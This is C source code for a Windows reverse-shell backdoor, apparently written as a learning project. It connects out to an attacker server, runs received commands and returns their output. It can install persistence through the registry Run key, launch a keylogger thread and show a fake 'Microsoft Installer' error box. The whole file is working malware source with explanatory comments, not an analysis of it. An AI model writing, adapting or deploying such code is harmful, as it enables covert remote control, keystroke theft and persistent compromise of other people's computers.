#include <string.h>
#include <stdio.h>
#include <stdlib.h>    //malloc....calloc
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p),0,(size))
int sock;


int bootRun(){
        char err[128] = "Failed\n";
        char suc[128] = "Created Persistence At: \\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
        
        TCHAR szPath[MAX_PATH];   // TCHAR => Win32 character string used to describe ANSII string , MAX_PATH => maximum path length limitation 256 character
                                  // to store path to our malware 

        DWORD pathLen=0;   // DWORD => can contatin unsigned integer value

        pathLen = GetModuleFileName(NULL, szPath,MAX_PATH); //szPath contain the exact path and pathLen contain strlength of the path
        if (pathLen == 0){
            send(sock,err,sizeof(err),0);
            return -1;
        }

        HKEY NewVal; //HKEY =>handle for an open registry key

        if (RegOpenKey(HKEY_CURRENT_USER,TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal) != ERROR_SUCCESS){
            //open a specified registry and try to add new value to it
            send(sock,err,sizeof(err),0);
            return -1;
        }

        //set the value to the registry key
        DWORD pathLenInBytes = pathLen * sizeof(*szPath); // sizeof(*szPath) => length of the first element; it actually points to the start of the address 
        if (RegSetValueEx( NewVal , TEXT("Hacked"), 0 ,REG_SZ, (LPBYTE)szPath , pathLenInBytes) != ERROR_SUCCESS){
            RegCloseKey(NewVal);
            send(sock,err,sizeof(err),0);
            return -1;
        }
        RegCloseKey(NewVal);
        send(sock,suc,sizeof(suc),0);
        return 0;
}

void Shell(){
    char buffer[1024];   //to receive the command from the server
    char container[1024];  //
    char total_response[18384];   //
    char suc[1024] = "Changed directory";

    while (1){  //iterate forever until breakpoint hit or task is fullfilled
        jump:
        bzero(buffer,1024);
        bzero(container,sizeof(container));
        bzero(total_response,sizeof(total_response));
        
        //receiving bytes from the server
        recv(sock,buffer,1024,0); //(socket variable, storage variable , sizeof storage variable , nothing)

        if (strncmp("q",buffer,1) == 0){ //1 => how much characters we are comparing
            closesocket(sock); 
            WSACleanup(); //this must be done to close the connection
            exit(0);
        }
        else if (strncmp("cd ",buffer,3) == 0){ // only cd print present working directory, we need change directory 
            char src[100];
            char dest[120];
            memset(dest, 0, sizeof(dest));
            strcpy(src, buffer);
            strncpy(dest, src+3, 100);
            chdir(dest);
        }
        else if (strncmp("persist",buffer,7) == 0){
           
            bootRun();
        }
        else if (strncmp("keylogger",buffer,10) == 0){
            //create a threat 
            HANDLE threat = CreateThread(NULL,0,logg,NULL,0,NULL);
            goto jump;
            
        }
        else{
            FILE *fp;
            fp = _popen(buffer,"r"); //==> read the buffer and execute it.
            while(fgets(container,1024,fp) != NULL){ //string from one variable to a different variable;Copy 1024 bits from fp to container
                strcat(total_response,container);  //concantenate total_response with the container
                                                   // first copy 1024 to total_response then the next 1024 bytes...then the next 1024 bytes...                                   
            }
            fp = _popen("cd","r");
            fgets(container,1024,fp);
            strcat(total_response,container);
            send(sock,total_response,sizeof(total_response),0); //sending to the server
            fclose(fp);
        }

    }


}

int APIENTRY WinMain(HINSTANCE hINSTANCE,HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    //hInstance: is something called a "handle to an instance" or "handle to a module." The operating system uses this value to identify the executable (EXE) when it is loaded in memory. The instance handle is needed for certain Windows functionsâ€”for example, to load icons or bitmaps.
    //hPrevInstance : has no meaning. It was used in 16-bit Windows, but is now always zero.
    //pCmdLine : contains the command-line arguments as a Unicode string.
    //nCmdShow : We need to unshow the window. Itis a flag that says whether the main application window will be minimized, maximized, or shown normally.

    
    //-------------------Make programme invisible--------------------
    HWND stealth;   // initialize the handle to a window
    AllocConsole(); // this will allocate the console to the calling process
    stealth = FindWindowA("ConsoleWindowClass",NULL);  // give handle to the top level window (ClassName, windowname{NULL})
    ShowWindow(stealth,1);  // (handle_of_window,0=> means hiding the window and activate another window)
    //-------------------Make programme invisible--------------------


    
    //-------------------Socket Programming-------------------- 
    struct sockaddr_in ServAddr; //ServAddr is the handle to the variables inside sockaddr_in
    unsigned short ServPort; //unsigned => non negative ServPort
    char *ServIP; 
    WSADATA wsaData; // WSADATA=>struct contain information about windows-sockets.
    
    ServIP = "127.0.0.1"; //IP of kali linux machine
    ServPort = 50004;

    if (WSAStartup(MAKEWORD(2,0),&wsaData) != 0){
        //The WSAStartup function must be the first Windows Sockets function called by an application or DLL. 
        //It allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation.
        //The application or DLL can only issue further Windows Sockets functions after successfully calling WSAStartup.
        
        // MAKEWORD(2,0)(from #include <minwindef.h>) => concantenate 0000000+0000010 => return 2
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM,0);
    //AF_INET => represents IPv4
    //SOCK_STREAM => represents TCP connection (3 way handshake connection)
    //0 => not specifying anything else

    memset((&ServAddr),0,sizeof(ServAddr)); //clear all the contents of ServAddr  to zeroes
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); //inet_addr => convert string to IP address
    ServAddr.sin_port = htons(ServPort); //htons => unsigned shot intto network byte order

    // tries to connect to server every 10s
    // goto can only seen in ASM and C
    start:
    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0){
        Sleep(10);
        goto start;
    }
    //-------------------Socket Programming--------------------


    //if connection established,remote shell is open
    MessageBox(NULL, TEXT("Hacked"),TEXT("Microsoft Installer"),MB_OK | MB_ICONERROR);
    Shell();
}